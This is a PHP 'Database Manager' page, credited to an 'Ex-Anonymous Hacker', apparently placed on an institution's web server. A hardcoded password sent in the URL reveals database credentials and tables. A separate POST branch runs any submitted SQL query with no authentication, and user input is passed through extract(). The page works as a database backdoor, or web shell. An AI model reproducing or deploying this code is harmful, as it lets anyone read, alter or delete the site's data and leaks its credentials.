<?php
	error_reporting(0);
	$protocol=($_SERVER['SERVER_PROTOCOL']==='https') ? 'https://' : 'http://';
	$URL=$protocol.$_SERVER['HTTP_HOST'];
	require_once 'config.php';
	$FaviconPath=$URL.'/images/fav.png';
	$showTablesQuery='SHOW TABLES FROM '.DB_NAME;
	$showTablesQueryString='Tables_in_'.DB_NAME;
	$showTablesQueryHandler=mysqli_query($conn, $showTablesQuery);
	$showTablesQueryHandlerCount=mysqli_num_rows($showTablesQueryHandler);
?>
<!DOCTYPE html>
<html>
<head>
	<meta name='description' content='Database Manager' />
	<meta name='keywords' content='Access, Delete or Fetch Database..' />
	<meta name='author' content='Ex-Anonymous Hacker' />
	<meta name='viewport' content='width=device-width, initial-scale=1.0' />
	<meta name='title' content='DB MANAGER' />
	<link rel='icon' type='image/png' href='<?php echo $FaviconPath ?>'>
	<title>DB MANAGER</title>
	<style type='text/css'>
		@import url('https://fonts.googleapis.com/css2?family=Tilt+Warp&display=swap');
		*{
			margin: 0px;
			padding: 0px;
			box-sizing: border-box;
			font-size: medium;
			font-family: 'Tilt Warp', cursive;
		}

		body{
			display: flex;
			flex-direction: column;
			justify-content: center;
			align-items: center;
		}

		u{
			color: red;
		}

		form {
			display: flex;
			flex-direction: column;
			margin-top: 1rem;
		}

		form input, select{
			width: 400px;
			padding: 5px;
			outline: none;
			border: 1px solid;
			margin-bottom: 10px;
		}

		form input[type=submit]{
			background: #000;
			color: #fff;outline: #fff;
			transition: 0.3s ease;
			width: 200px;
		}

		form input[type=submit]:hover{
			background: #000;
			color: #00ff00;
			cursor: pointer;pointer-events: auto;
		}

		table {
		  font-family: arial, sans-serif;
		  border-collapse: collapse;
		  width: 100%;
		  margin-top: 2rem;
		  margin-bottom: 2rem;
		  display: none;
		  visibility: hidden;
		}

		td, th {
		  border: 1px solid #dddddd;
		  text-align: left;
		  padding: 8px;
		}

		tr:nth-child(even) {
		  background-color: #dddddd;
		}

	</style>
</head>
<body>
	<h1>Welcome to <u><?php echo $URL; ?></u> Database Manager</h1>
<?php
	if($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['adminPassword'])) {
		extract($_GET);
		if(!strcmp('www.pimse.edu.in@2022', $adminPassword)){
			//Access the DB
?>
	<form action='<?php echo $_SERVER['PHP_SELF'] ?>' method='POST'>
		<label>DB HOST: </label>
		<input type='text' name='db_name' value='<?php echo DB_HOST ?>' readonly disabled />
		<label>DB USER: </label>
		<input type='text' name='db_name' value='<?php echo DB_USER ?>' readonly disabled />
		<label>DB PASS: </label>
		<input type='text' name='db_name' value='<?php echo (!empty(DB_PASS)) ? substr(DB_PASS, 0,3).'***'.substr(DB_PASS, 8,strlen(DB_PASS)) : '' ?>' readonly disabled />
		<label>DB NAME: </label>
		<input type='text' name='db_name' value='<?php echo DB_NAME ?>' readonly disabled />
		<label>Select a Table: </label>
		<select name='db_table' onchange='checkSelected()'>
			<option value=''>To check the field names...</option>
			<?php while($showTablesQueryResult=mysqli_fetch_assoc($showTablesQueryHandler)){  $showTablesQueryHandlerCount--; ?><option value='<?php echo $showTablesQueryResult[$showTablesQueryString]; ?>' ><?php echo $showTablesQueryResult[$showTablesQueryString];?></option>
			<?php } ?></select>
		<div class='tableArea'>
			<table>
			</table>
		</div>
		<label>Enter a query: </label>
		<input type='text' name='db_query' placeholder='Enter query to execute...' required />
		<input type='submit' name='db_exec_query' value='Execute Query'>
	</form>
	<script type='text/javascript'>
		function checkSelected(){
			const options = document.querySelectorAll('select option');
			let tblArea=document.querySelector('.tableArea table');
			tblArea.innerHTML=``;
			for(let i=0; i<options.length; i++) {
				if(options[i].selected) {
					const xml=new XMLHttpRequest();
					xml.onreadystatechange=function(){
						if(this.readyState===4 && this.status===200){
							let all_field_names = JSON.parse(this.responseText);
							tblArea.innerHTML=`
								<tr><th>TABLE(s)</th></tr>
							`;
							for(let len=0; len<all_field_names.length; len++) {
								tblArea.innerHTML+=`<tr><td>${all_field_names[len].tbl_name} (${all_field_names[len].tbl_size})</td></tr>`;
							}

							document.querySelector('table').style.display='block';
							document.querySelector('table').style.visibility='visible';
						}
					}
					xml.open('POST', 'db_show_feilds.php', true);
					xml.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
					xml.send('table_name='+options[i].value.trim());
				}
			}
		}
	</script>
</body>
</html>
<?php
	}else{
		printf('<script>window.location.href=\'%s\'</script>', $URL);
		}
	}elseif($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['db_exec_query'])) {
		extract($_POST);
		// $db_query=mysqli_real_escape_string($conn, $db_query);
		$databaseQuery=mysqli_query($conn, $db_query);
		if($databaseQuery){
			$affectedRows=mysqli_affected_rows($conn);
			if($affectedRows>1){
				$databaseQueryCount=mysqli_num_rows($databaseQuery);
				while($databaseQueryResult=mysqli_fetch_array($databaseQuery)){
					$fetchFieldNamesQuery='SELECT * FROM '.$db_table;
					$fetchFieldNamesHandler=mysqli_query($conn, $fetchFieldNamesQuery);
					while ($property = mysqli_fetch_field($fetchFieldNamesHandler)) {
						if(empty($databaseQueryResult[$property->name]))
							continue;
						else
							echo $property->name.'='.$databaseQueryResult[$property->name].'<br/>';
					}
					echo '<br/>';
				}
			}else{
				echo 'Data inserted Successfully !';
			}
		}else{
			echo mysqli_error();
		}
	}
	exit;
?>
